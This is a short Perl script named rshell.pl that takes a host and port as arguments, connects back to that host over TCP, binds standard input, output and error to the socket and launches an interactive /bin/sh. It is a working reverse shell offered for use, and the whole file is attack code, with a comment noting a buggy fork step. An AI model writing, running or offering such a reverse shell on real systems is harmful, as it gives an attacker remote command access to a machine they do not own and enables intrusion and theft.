#!/usr/bin/perl
use strict;
use warnings;
use Socket;

sub rshell {
  my ($revip, $revport) = @_;
  print "Phoning home to ".$revip.":".$revport."...\n";
  { # buggy af
    if (fork()) { close(); exit(); }
  }
  socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
  if(connect(S,sockaddr_in($revport,inet_aton($revip)))){
    # this next bit. we should try for a TTY...
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
  }
}

if ($#ARGV + 1 != 2){
  print "use: ./rshell.pl host port\n";
  exit;
}
rshell($ARGV[0], $ARGV[1]);
